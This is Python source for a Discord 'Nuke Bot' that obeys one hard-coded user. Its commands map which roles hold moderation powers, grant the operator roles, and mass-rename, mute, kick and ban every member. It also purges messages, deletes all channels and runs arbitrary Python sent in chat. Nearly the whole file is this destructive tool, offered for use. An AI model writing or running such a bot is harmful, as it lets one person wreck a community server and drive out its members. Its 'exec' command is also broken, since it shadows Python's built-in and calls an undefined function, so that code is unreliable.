import discord
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='*', intents=intents, case_insensitive=True, max_messages=100000)
bot.remove_command('help')
userID = DISCORD_USER_ID_HERE

# Bot Startup Event
@bot.event
async def on_ready():
    print('Nuke Bot loaded succesfully!')

# Bot Say
@bot.command()
async def say(ctx, channel: discord.TextChannel = None, *, message: str = None):
	if ctx.author.id == userID:
		await ctx.message.delete()
		if message and channel in ctx.guild.channels:
			await channel.send(message)
			
# Role Checker
@bot.command()
async def roles(ctx):
	if ctx.author.id == userID:
		admins = []
		canManageServer = []
		canViewAuditLog = []
		canBan = []
		canKick = []
		canMute = []
		canDeafen = []
		canMove = []
		canManageRoles = []
		canManageChannels = []
		canManageMessages = []
		canManageNicknames = []
		canManageEmojis = []
		for role in ctx.guild.roles:
			if role.permissions.administrator:
				admins += role.mention
				continue
			if role.permissions.manage_guild:
				canManageServer += role.mention
			if role.permissions.view_audit_log:
				canViewAuditLog += role.mention
			if role.permissions.ban_members:
				canBan += role.mention
			if role.permissions.kick_members:
				canKick += role.mention
			if role.permissions.mute_members:
				canMute += role.mention
			if role.permissions.deafen_members:
				canDeafen += role.mention
			if role.permissions.move_members:
				canMove += role.mention
			if role.permissions.manage_roles:
				canManageRoles += role.mention
			if role.permissions.manage_channels:
				canManageChannels += role.mention
			if role.permissions.manage_messages:
				canManageMessages += role.mention
			if role.permissions.manage_nicknames:
				canManageNicknames += role.mention
			if role.permissions.manage_emojis:
				canManageEmojis += role.mention
		embed = discord.Embed(colour=discord.Colour.from_rgb(0, 0, 0))
		if admins:
			embed.add_field(name='Admins', value=''.join(admins), inline=True)
		if canManageServer:
			embed.add_field(name='Manage Server', value=''.join(canManageServer), inline=True)
		if canViewAuditLog:
			embed.add_field(name='View Audit Log', value=''.join(canViewAuditLog), inline=True)
		if canBan:
			embed.add_field(name='Can Ban', value=''.join(canBan), inline=True)
		if canKick:
			embed.add_field(name='Can Kick', value=''.join(canKick), inline=True)
		if canMute:
			embed.add_field(name='Can Mute', value=''.join(canMute), inline=True)
		if canDeafen:
			embed.add_field(name='Can Deafen', value=''.join(canDeafen), inline=True)
		if canMove:
			embed.add_field(name='Can Move', value=''.join(canMove), inline=True)
		if canManageRoles:
			embed.add_field(name='Manage Roles', value=''.join(canManageRoles), inline=True)
		if canManageChannels:
			embed.add_field(name='Manage Channels', value=''.join(canManageChannels), inline=True)
		if canManageMessages:
			embed.add_field(name='Manage Messages', value=''.join(canManageMessages), inline=True)
		if canManageNicknames:
			embed.add_field(name='Manage Nicknames', value=''.join(canManageNicknames), inline=True)
		if canManageEmojis:
			embed.add_field(name='Manage Emojis', value=''.join(canManageEmojis), inline=True)
		await ctx.send(embed=embed)
        
# Role Giver
@bot.command()
async def role(ctx, *, role):
    if ctx.author.id == userID:
        role = discord.utils.get(ctx.guild.roles, name=role)
        if role:
            await ctx.author.add_roles(role)

# Nickname Changer
@bot.command()
async def rename(ctx, *, nickname):
	if ctx.author.id == userID:
		for member in ctx.guild.members:
			if not member.id == userID:
				try:
					await member.edit(nick=nickname)
				except:
					continue
				
# Mutes All Users
@bot.command()
async def mute(ctx):
	if ctx.author.id == userID:
		role = discord.utils.get(ctx.guild.roles, name='Muted')
		if not role:
			role = await ctx.guild.create_role(name='Muted')
		for member in ctx.guild.members:
			if not member.id == userID:
				try:
					await member.add_roles(role)
				except:
					continue

# Kicks All Users
@bot.command()
async def kick(ctx):
	if ctx.author.id == userID:
		for member in ctx.guild.members:
			if not member.id == userID:
				try:
					await ctx.guild.kick(member)
				except:
					continue
				
# Bans All Users
@bot.command()
async def ban(ctx):
	if ctx.author.id == userID:
		for member in ctx.guild.members:
			if not member.id == userID:
				try:
					await ctx.guild.ban(member)
				except:
					continue
				
# Message Purger
@bot.command()
async def purge(ctx):
	if ctx.author.id == userID:
		await ctx.channel.purge()
		
# Delete Channels
@bot.command()
async def wipe(ctx):
    if ctx.author.id == userID:
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                continue
        await ctx.guild.create_text_channel(name=f'nuked-by-{ctx.author.display_name}')

# Custom Script Execution
@bot.command()
async def exec(ctx, *, script):
    if ctx.author.id == userID:
        exec(script, globals())
        await execution(ctx)

# Bot Connection
bot.run('BOT_TOKEN_HERE')
